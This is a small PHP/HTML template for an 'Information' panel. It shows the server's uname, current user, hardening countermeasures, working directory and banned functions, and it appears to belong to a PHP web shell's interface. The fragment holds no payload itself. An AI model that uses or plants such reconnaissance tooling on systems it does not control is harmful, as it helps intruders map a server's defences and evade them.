<div class="panel panel-primary">
	<div class="panel-heading">
		<h3 class="panel-title">Information</h3>
	</div>
	<div class="panel-body">
		<div class="form-group">
			<label class="col-sm-1 text-uppercase">Uname</label>
			<div class="col-sm-11">
				<p class="form-control" style="background-color: lightgray"><?php echo safe_uname(); ?></p>
			</div>
		</div>
		<div class="form-group">
			<label class="col-sm-1 text-uppercase">USER</label>
			<div class="col-sm-11">
				<p class="form-control" style="background-color: lightgray"><?php echo safe_id(); ?></p>
			</div>
		</div>
		<div class="form-group">
			<label class="col-sm-1 text-uppercase">HARDENING</label>
			<div class="col-sm-11">
				<p class="form-control" style="background-color: lightgray"><?php echo colorize_on_off(list_countermeasures()); ?></p>
			</div>
		</div>
		<div class="form-group">
			<label class="col-sm-1 text-uppercase">CUR DIR</label>
			<div class="col-sm-11">
				<p class="form-control" style="background-color: lightgray"><?php echo try_call_func("getcwd"); ?></p>
			</div>
		</div>
		<div class="form-group">
			<label class="col-sm-1 text-uppercase">BANNED</label>
			<div class="col-sm-11">
				<p class="form-control" style="background-color: lightgray"><?php echo list_banned(); ?></p>
			</div>
		</div>
	</div>
</div>